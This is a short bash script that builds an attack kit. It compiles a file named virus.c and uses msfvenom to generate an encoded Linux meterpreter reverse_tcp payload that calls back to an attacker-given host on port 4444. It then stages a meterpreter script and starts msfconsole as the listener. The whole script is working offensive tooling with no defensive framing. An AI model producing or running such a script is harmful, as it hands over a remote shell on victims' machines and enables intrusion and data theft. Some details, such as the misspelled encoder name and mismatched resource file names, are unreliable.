#!/bin/bash

set -e

# Build malware executable
gcc -g -I/libpcap-1.8.1/pcap virus.c -lpcap

# Create binary version of exploit
cd /opt/metasploit-framework/bin
./msfvenom -a x86 --platform linux -p x86/linux/meterpreter/reverse_tcp LHOST=$1 LPORT=4444 -e x86/shikata_na_gai -f elf -o virus

# Move the meterpreter script to where metasploit can find it
mv meterpreter_script.rc /usr/share/metasploit-framework/scripts/meterpreter

# Start the console with the script file
./msfconsole -r meterpreter.rc
